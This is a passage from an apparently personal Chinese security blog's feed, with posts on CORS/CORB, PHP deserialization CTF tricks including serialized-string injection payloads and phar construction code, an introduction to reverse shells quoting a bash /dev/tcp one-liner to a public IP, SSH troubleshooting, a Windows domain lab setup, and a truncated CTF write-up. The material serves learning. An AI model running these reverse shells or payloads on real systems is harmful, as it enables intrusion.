<h3 id="Ajax和src等标签的区别"><a href="#Ajax和src等标签的区别" class="headerlink" title="Ajax和src等标签的区别"></a>Ajax和src等标签的区别</h3><p>Ajax是专门用于发送请求的，也就是说正常情况下Ajax请求的回复可以被当前页面获取，而src等标签只能发送请求，取来的内容被浏览器接管，当前页面并不能获得返回的内容，但浏览器能把它展示出来（比如把img展示出来，引入的js脚本跑起来）<br>但当Ajax发出的为跨域请求时，收到的回复内容会被拦截，无法被页面获取，但是还是可以被收到的，就是进入这个标签页进程的内存空间（但是浏览器是不给你获取到内容的），但是可以利用熔断漏洞读取内存，解决方案为CORB，直接阻止请求进入进程内存</p>
<h3 id="CORB"><a href="#CORB" class="headerlink" title="CORB"></a>CORB</h3><p>全称Cross-Origin Read Blocking，为了防止熔断漏洞虽然拦截了请求但是通过读内存获取数据出现的方案，不仅能拦截请求，甚至可以阻止请求进入进程内存，绝对防御（大概）</p>
<h3 id="Ajax跨域请求解决方案"><a href="#Ajax跨域请求解决方案" class="headerlink" title="Ajax跨域请求解决方案"></a>Ajax跨域请求解决方案</h3><h4 id="Jsonp"><a href="#Jsonp" class="headerlink" title="Jsonp"></a>Jsonp</h4><p>同源策略的一种简陋解决方案，因为同源策略放行src，事先在页面上定义好一个callbackfunc，通过src跨域请求数据，服务端返回约定格式的数据（即符合callbackfunc的数据），返回后由callbackfunc处理获取的对应数据</p>
<h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>同源策略现在比较成熟的解决方案，当发起跨域请求时，先向被请求资源的一方发起一个OPTION预检请求，让被请求方返回一堆Access-Control-Allow-xxx的响应头来决定该资源能否被跨域请求，如果响应头不允许请求该资源，则该请求<strong>不会被发出</strong><br>但存在部分简单请求不会触发CORS预检请求，即下列方法之一（fetch的get、post不算）</p>
<ul>
<li>GET</li>
<li>HEAD</li>
<li>POST</li>
<li>Content-Type 的值仅限于下列三者之一：<ul>
<li>text&#x2F;plain</li>
<li>multipart&#x2F;form-data</li>
<li>application&#x2F;x-www-form-urlencoded</li>
</ul>
</li>
<li>….剩下的详见MDN吧<br>但是不触发预检请求不等于请求结果可读，只是能跳过OPTIONS步骤直接将请求发出，但若回复中没有对应的响应头，所获得的结果仍会被浏览器block，无法被页面获取</li>
</ul>
<p>因此，就算配置了CORS也不能阻止CSRF之类的攻击，还是可以用这些简单请求进行数据提交，cookie的冒用还是得靠之前CSRF的那几个策略阻止</p>
<p>MDN上好像提到CORS默认不带凭证（cookie），需要发请求的时候加一个标记才会发送？</p>
<h2 id="CSP与CORS的差异"><a href="#CSP与CORS的差异" class="headerlink" title="CSP与CORS的差异"></a>CSP与CORS的差异</h2><p>一开始感觉这两个东西应该是类似的，但后来仔细想了想发现，CSP是由服务端指定自己所信任的源，规定的是可加载的白名单范围，而CORS则是服务端指定自己的服务所信任的请求者，允许哪些页面能通过前端代码获取自己的数据，指定的是允许被加载的白名单范围。<br>即一个是限制自己能加载的数据，一个是限制能加载自己的请求者</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a><br><a href="https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html">https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html</a><br><a href="https://blog.csdn.net/zzzmmmkkk/article/details/10862949">https://blog.csdn.net/zzzmmmkkk/article/details/10862949</a><br><a href="https://www.jianshu.com/p/beb059c43a8b">https://www.jianshu.com/p/beb059c43a8b</a><br><a href="http://www.yaoyanhuo.com/blog/corb/">http://www.yaoyanhuo.com/blog/corb/</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title>博客迁移</title>
    <url>/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB.html</url>
    <content><![CDATA[<h1 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h1><p>想办法把博客整到国内来了，为自己增加一点点击量&#x3D;.&#x3D;<br>也是方便配一下域名https之类的，方便以后测试<br>GitHub页面会同步更新，但是评论什么的功能可能就不维护了（看了一下说明好像还能正常用）</p>
<p>重置了一遍APP原来好不容易积攒下来的阅读量和评论清零了呜呜呜</p>
<p>新的博客链接<br><a href="https://blog.z3ratu1.cn/">https://blog.z3ratu1.cn</a><br>域名还在备案，过两天应该就能用了</p>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>cn域名太坑了，备案一堆要求就算了，审核还是在13个工作日内。。。。服了<br>然后今天尝试访问一下自己的https博客，直接被connection reset，还以为ssl证书配出问题了，上服务器一看屁事没有，Apache也活的好好的，开始测试<br>http访问会出现未备案警示，https直接reset，改成域名加端口可以正常访问但Chrome会警告证书无效<br>百度得出结论，就是单纯的域名备案没过就都给你ban了，详见<br><a href="https://www.oschina.net/question/1476773_2304801">https://www.oschina.net/question/1476773_2304801</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h1 id="PHP中的反序列化漏洞"><a href="#PHP中的反序列化漏洞" class="headerlink" title="PHP中的反序列化漏洞"></a>PHP中的反序列化漏洞</h1><h2 id="可能利用反序列化的提示"><a href="#可能利用反序列化的提示" class="headerlink" title="可能利用反序列化的提示"></a>可能利用反序列化的提示</h2><p>代码中出现<code>file_get_content</code>等文件操作相关函数<br><code>unserialze</code>，<code>serialze</code>等危险函数<br>类中存在<code>__wakeup</code>，<code>__toString</code>，<code>__call</code>，<code>__sleep</code>等魔法方法<br>这时输入若可控，即可构造序列化数据，在反序列化过程中执行函数，控制文件读取，拿到flag</p>
<p>且__construct()函数只在对象创建（new）时会自动调用，但在 unserialize() 时是不会自动调用的</p>
<h2 id="wakeup函数绕过"><a href="#wakeup函数绕过" class="headerlink" title="__wakeup函数绕过"></a>__wakeup函数绕过</h2><p>要求：PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10<br>__wakeup()函数在序列化对象被反序列化时调用，如果此时序列化数据显示的数据个数与实际数据个数不符，即可跳过对__wakeup()函数的调用<br>如：<code>O:3:&quot;Stu&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;lzx&quot;;&#125;</code>此时的Stu类只有一个名为lzx的数据name，但序列化数据显示该类拥有两个数据，即可引发错误跳过对__wakeup()函数的执行</p>
<h2 id="不同对象的反序列化"><a href="#不同对象的反序列化" class="headerlink" title="不同对象的反序列化"></a>不同对象的反序列化</h2><p>不同对象反序列化时起键名将会发生改变，就public对象而言，protected对象在反序列化时，其键名会变为<code>%00\*%00key</code>，而private对象为<code>%00classname%00key</code>，%00为url编码的字符</p>
<h2 id="字符逃逸漏洞"><a href="#字符逃逸漏洞" class="headerlink" title="字符逃逸漏洞"></a>字符逃逸漏洞</h2><p>序列化数据经过某些过滤后数据长度发生改变，使得可控字符串逃逸出来反序列化收到控制</p>
<h3 id="字符增加导致逃逸"><a href="#字符增加导致逃逸" class="headerlink" title="字符增加导致逃逸"></a>字符增加导致逃逸</h3><p>讲解背景为0ctf2016的piapiapia<br>首先，我们可以通过凭借数据的方法改变序列化内容<br>例如现在有序列化内容<code>O:3:&quot;Stu&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;lzx&quot;;s:4:&quot;data&quot;;s:3:&quot;abc&quot;;&#125;</code><br>我们只能控制name变量，但也可以以此修改data 的内容，比如我们令name&#x3D;<code>lzx&quot;;s:4:&quot;data&quot;;s:6:&quot;hacker&quot;;&#125;</code><br>此处name在序列化时会被认为长度是30<br>这样子我们的数据就变为了<code>&#123;s:4:&quot;name&quot;;s:30:&quot;lzx&quot;;s:4:&quot;data&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;data&quot;;s:3:&quot;abc&quot;;&#125;</code><br>在序列化过程中，后面多余的数据会被舍弃<br>但这里还有一个问题，当描述数据长度的数与数据长度不一致时，会导致反序列化失败<br>但是本题拥有一个特殊环境，它将SQL注入相关的语句如<code>select,insert,where</code>等语句统一替换成了<code>hacker</code>，这里从where到hacker使得整体的字符多出了一个，这意味着我们每输入一个where就使得我们可控字符增加一个。<br>所以当我们输入一定数量的where时，增加出来的字符就会填补上我们原来自己注入字符所占用的位置，完成反序列化的操作，而后面的真实数据则被我们抛弃，完成了对数据的篡改</p>
<h3 id="字符减少导致逃逸"><a href="#字符减少导致逃逸" class="headerlink" title="字符减少导致逃逸"></a>字符减少导致逃逸</h3><p>题目为安洵杯 2019 easy_serialize_php，本题将flag，PHP等字眼替换为空，利用extract($_POST);进行变量覆盖，控制变量进行反序列化，这里有两种控制方法<br>正常反序列化字符串为<code>a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;test&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code><br>可以同时控制guest和function的值，使得guest的值将function的键部分吃掉，使function的值逃逸出来，覆盖img<br>也可重新添加一对键值，通过键名吃掉值的部分，使得部分构造好的值逃逸，覆盖后续的img</p>
<h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>这里有一个坑，他使用extract($_POST);解析变量，需要我发包时的content-type为application&#x2F;x-www-form-encoded，不然没得用</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html">https://www.cnblogs.com/wangtanzhi/p/12261610.html</a></p>
<h2 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h2><p>发生在php中存在的文件操作函数参数可控，将打包的phar包改为任意后缀上传并以phar协议读取即可<br>phar被正则开头匹配禁止的场合可以使用<code>php://filter/resource=phar://</code>进行绕过<br><code>finfo_file/finfo_buffer/mime_content_type</code>这些函数均可通过phar协议触发反序列化，因此看到这些函数的时候就可以考虑这个方法了</p>
<p>这里注意构造数据时数据类型要与原来的数据类型完全一致，不能说名字相同反序列化就能成功。public和private反序列化后private多一个不可见字符。并且原来的array之类的变量都要进行初始化，做好代码审计工作</p>
<p>例题有bytectf的ezcms<br>贴一个Zedd师傅的文章<a href="https://xz.aliyun.com/t/6057">https://xz.aliyun.com/t/6057</a></p>
<h3 id="phar反序列化影响的函数"><a href="#phar反序列化影响的函数" class="headerlink" title="phar反序列化影响的函数"></a>phar反序列化影响的函数</h3><p><code>fileatime / filectime / filemtime </code>stat &#x2F; fileinode &#x2F; fileowner &#x2F; filegroup &#x2F; fileperms<br><code>file / file_get_contents / readfile / fopen</code><br><code>file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable </code>parse_ini_file<br><code>unlink </code>copy&#96;<br>有关文件的操作基本都被涉及，在这些函数下使用phar:&#x2F;&#x2F;协议对文件进行访问均可触发我们先前构造好的数据进行巧妙的攻击</p>
<h3 id="phar反序列化数据的构造"><a href="#phar反序列化数据的构造" class="headerlink" title="phar反序列化数据的构造"></a>phar反序列化数据的构造</h3><p><code>$a = new File(&#39;123&#39;,&#39;456&#39;); //构建一个设计好数据的变量 </code><br><code>//echo unserialize($a);</code><br><code>$phar = new Phar(&quot;1.phar&quot;); //后缀名必须为phar</code><br><code>$phar-&gt;startBuffering();</code><br><code>$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，需要绕过图片检测时可在前面加GIF23a</code><br><code>$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest</code><br><code>$phar-&gt;addFromString(&quot;1.txt&quot;, &quot;test&quot;); //添加要压缩的文件,内容无意义</code><br><code>//签名自动计算</code><br><code>$phar-&gt;stopBuffering();</code><br>例题为bytectf的ezcms</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell入门</title>
    <url>/%E5%8F%8D%E5%BC%B9shell.html</url>
    <content><![CDATA[<h1 id="反弹shell入门"><a href="#反弹shell入门" class="headerlink" title="反弹shell入门"></a>反弹shell入门</h1><p>起源于今天AA师傅的一个简单web，但是由于对反弹shell的一无所知和对某些知识的偏差认识浪费了一个下午没做出来<br>反弹shell需要对标准输入输出流重定向有一点基础的理解，大致原理不在赘述，只是做个记录</p>
<p>上很简单的源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2 id="PHP的命令执行"><a href="#PHP的命令执行" class="headerlink" title="PHP的命令执行"></a>PHP的命令执行</h2><p>反引号``等价于一个函数shell_exec()，传入一个参数cmd并在命令行中执行它，但是执行输出由返回值给出（所以我echo了一个下午在想为什么没有回显），<strong>使用sleep即可尝试是否进行了命令执行</strong><br>这里构造<code>$a</code>;作为$a的前五个字符，eval函数即为执行`$a`；即在命令行下输入$a的内容。所以$a的内容前五个字符确定，后门即可任意代码执行。由于执行结果在函数返回值中无法获取，则需要通过外带的方法获取结果</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>一个方法就是通过受害机反向链接攻击机取得一个shell，即为反弹shell<br>通过<code>nc -lvp port</code> 监听攻击机的端口<br>在受害机上执行<code>bash -i &gt;&amp; /dev/tcp/公网ip/port 0&gt;&amp;1</code>，链接攻击机，这个语句将受害机的标准输入输出全部重定向到攻击机上，实现在攻击机端获取受害机shell，这里实操的时候这一句还不够，需要<code>bash -c bash -i &gt;&amp; /dev/tcp/47.103.140.44/10005 0&gt;&amp;1&quot;</code>才成功连接到我的服务器上，弹shell的语句还可以构造出很多种，这只是一个无过滤的简单后门，暂时对弹shell这个操作进行入门罢了</p>
<h2 id="curl外带"><a href="#curl外带" class="headerlink" title="curl外带"></a>curl外带</h2><p>也可以通过curl对自己的服务器发包将数据外带，不过我还不会（菜）</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>垃圾学校的奇怪网络规则</title>
    <url>/%E5%9E%83%E5%9C%BE%E5%AD%A6%E6%A0%A1%E7%9A%84%E5%A5%87%E6%80%AA%E8%A7%84%E5%88%99.html</url>
    <content><![CDATA[<h1 id="垃圾学校的奇怪网络规则"><a href="#垃圾学校的奇怪网络规则" class="headerlink" title="垃圾学校的奇怪网络规则"></a>垃圾学校的奇怪网络规则</h1><p>昨天做题要弹shell，然后打开我的mobaxterm开始连vps，卡住了没反应，十秒之后timeout<br>我第一反应是vps被日了，赶紧上阿里云控制台看了一眼，阿里云控制台的ssh还连得上去，简单检查一通好像屁事没有，去看了一眼端口放行规则，也没有ban22端口，就很玄幻</p>
<p>ping了一下vps，ping通了，在群里反应了一下问题，大哥们的机子都是腾讯云的，就我是阿里云，学校里的同学们都ssh不上我这个机子，然后大家腾讯云的机子都连的好好的，无奈之下去找阿里云售后<br>售后操作了一通感觉配置都没问题，售后能连上我的机子，找了不在我们学校的大哥试着连也连得上，最后问我是不是我们这网络配置的问题，我一个小朋友怎么知道学校的路由策略。。。。然后切手机热点也连不上，很困惑（但是后来又试了一次切热点又连上了，估计出了奇怪的问题）<br>学姐也有机子ssh连不上了，最后和我说换个ssh服务的端口就连得上了，所以，最后的最后的结论是，学校可能使用了奇怪的策略，导致流向部分ip的22端口的流量被阻断了<br>为此还专门跑去问网络中心的老师，得到的答复是最近什么更改都没有做，我是不信的</p>
<p>反正最后改了个端口通了，浪费我一个晚上</p>
<p>改端口记得改的配置文件是sshd_connfig，不是ssh_config，居然还有这种事<br>sshd_config是ssh服务的设置，ssh_config是客户端ssh的设置。。</p>
<p>顺便把vps改成不允许密码登录，直接公私钥认证登录了</p>
<p>学到几个运维小命令（是不是得抽时间也学一下Linux运维）</p>
<pre class=" language-shell"><code class="language-shell">netstat -nptl |grep ssh 查看ssh服务端口
netstat -nptl |grep 22    查看22端口
grep "fail" /var/log/auth.log |uniq -c | sort -nr | more 看哪些人在扫ssh
</code></pre>
<h2 id="修改ssh端口后git-deploy问题"><a href="#修改ssh端口后git-deploy问题" class="headerlink" title="修改ssh端口后git deploy问题"></a>修改ssh端口后git deploy问题</h2><p>22端口我其实没关。。。但是学校这个网就是22端口上不去，所以还得改一下，在站点配置的deploy下修改一下</p>
<pre><code>  repo: 
    server: ssh://git@ip:port/var/www/blog/hexo.git
</code></pre>
<p>并且这个登录忘了是怎么认证的了，反正试了一下能不要密码，现在服务器私钥登录禁止密码登录，可行<br>服了。。。GitHub的22端口也上不去，现在国内机子同步更新了Gitpage更新不了，太垃圾了</p>
<pre class=" language-shell"><code class="language-shell">ssh: connect to host github.com port 22: Connection timed out
fatal: Could not read from remote repository.
</code></pre>
<p>当一回热点战士把更新推上去吧</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>域环境搭建</title>
    <url>/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
    <content><![CDATA[<h1 id="域环境搭建"><a href="#域环境搭建" class="headerlink" title="域环境搭建"></a>域环境搭建</h1><p>科恩的任务还没完成，我是划水王<br>前两天看了看文章，摸了两天鱼，今天搭了一天环境到这个时候呜呜<br>还是参考的好姐姐的文章进行搭建</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先是折腾了一下午破解，不是很喜欢30天回退一次快照，万一我以后还有更改就不方便了。其次就是研究网络，其实VMware虚拟机咋整都是在一个子网内，用同一个虚拟网络适配器就行了，NAT Host-Only都行。接不接物理机进来都无所谓，DHCP开不开也无所谓（但是DC的ip还是写死比较好）</p>
<p>winserver12作为域控DC，按照上面的步骤升级为域控，选择新建林，填一个二级域名进去，我这里填为z33.com，一路默认即可<br>加入域后计算机全名为: 计算机名+.z33.com<br>整个环境由如下四台机子构成<br>winsever12 DC<br>winsever08 webServer<br>winserver16 后来随便加的。。。<br>win7 管理员主机</p>
<p><strong>WIN7不要用家庭版！！！家庭版没有加入域功能，坑死我了</strong></p>
<p>才发现是只要拥有一个域账户就能登录到域了。。。之前还对应每个机子创建了一个域的账户<br>通过文末链接中步骤即可成功加入域，加入域后登陆机器就有了两种选项，一种是登录本机，一种是登录到域，登录本机就使用<code>主机名\本地用户名</code>,登录远程就变成了<code>域名\主机名</code>或者<code>主机名@域名</code>（似乎是这样的）</p>
<p>可以通过每个机子配多个网卡，网卡选host-only然后搭建多层局域网</p>
<h3 id="安装VMware-tools"><a href="#安装VMware-tools" class="headerlink" title="安装VMware tools"></a>安装VMware tools</h3><p>用VMware就是为了这个工具吧，自动调整虚拟机屏幕大小和虚拟机物理机文件复制。然后，以前都是直接左上角选项卡自动化安装，就算是Linux也是自动挂在好了命令行解压一下就行，今天遇到了整个图标是灰色的的懵逼状态，本来都说大不了U盘代替了，群里随便问了一嘴发现原来是这么装的。。。<br>只要把虚拟机的CD选择的文件改成VMware文件夹下的Windows.iso，然后虚拟机内读取就能安装了。Linux估计就是那个Linux.iso。以后装不了VMwaretools都可以这么一次性搞定了</p>
<p>Windows server2012R2比较坑，还要先装个什么鬼补丁才能用。<br>用这个大哥打包的东西就能搞定<a href="https://blog.csdn.net/weixin_38735531/article/details/105885499">关于Windows Server 2012安装KB2919355补丁出错问题都看过来了！！！</a><br>记得补丁看着装。。。我装着装着发现不对劲，把kerberos的补丁也打了，然后删补丁的时候又删多了，白瞎一个晚上</p>
<h2 id="域网络连接"><a href="#域网络连接" class="headerlink" title="域网络连接"></a>域网络连接</h2><p>之前真没怎么研究过windows，今天域都加入完了，ping一轮ping不通，但是所有机子pingDC是通的，就开始研究网络问题，经过长达几个小时的测试，我一度怀疑VMware哪里有玄妙的网络设置，最后发现是防火墙的问题。。。防火墙一关直接全通。<br>那么，大家都有防火墙为什么只有DC能被ping通？查看网络情况发现DC连接的网络被识别为域网络，而剩下两台机子却显示的是未识别的网络，那就只能猜测是域上防火墙的策略和公用网络的防火墙策略不一致咯？<br>然后就开始研究怎么让后面两台机子识别出网络类型<br>找到这样一个网页<br><a href="https://social.technet.microsoft.com/Forums/windows/it-IT/3f156eca-c4ee-4693-aa16-882800070a82">域网络识别问题</a></p>
<blockquote>
<p>当NLA开始检测网络位置时，计算机将尝试DC联系。如果检测成功，就可以识别到域网络，如果检测不到域或者是处理失败，就会识别为私有或公共网络</p>
</blockquote>
<p>一个可能就是每次我一把梭启动三个机子的时候，DC启动最慢导致出问题，不过把网络先禁用再重新启用网络的结果仍是公共网络，采用第二种方法，在IPv4的DNS设置里面添加一个后缀项，就大功告成了（ip是静态分配的让DC成为DNS），但是所有机子都连上域网络之后还是ping不通，估计是防火墙还是怎么不放ICMP过吧<br>开始开关防火墙规则，有点小小的强迫症，就是不想简单的直接关掉整个防火墙。。。<br>neorah师傅后面遇到的那个无法管理的问题也可以直接防火墙放行解决，总觉得一页钩比一页叉好看</p>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p>又参考了一些其他文章，修改了一下域环境的配置。给winserver08加了一块网卡，使得其能连接外网，直接桥接出来（之前桥接没成功，后来重启了一下又没问题了），然后再整个kali虚拟机去日。可以在08上起一个web服务然后物理机访问去日，模拟内网突破口。。win7作为管理员服务器，不直接操作DC，而是通过管理员服务器登录DC进行配置之类的，大概想先整出来这么个内网环境</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://neorah.me/pentest/startpentest">基础知识及环境搭建</a><br><a href="https://k-ring.github.io/2019/10/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">域环境搭建</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛 Love Math</title>
    <url>/%E5%9B%BD%E8%B5%9BLove%20Math.html</url>
    <content><![CDATA[<h1 id="国赛-Love-Math"><a href="#国赛-Love-Math" class="headerlink" title="国赛 Love Math"></a>国赛 Love Math</h1><p>太难了，我不会</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>先上源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//例子 c=20-1</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
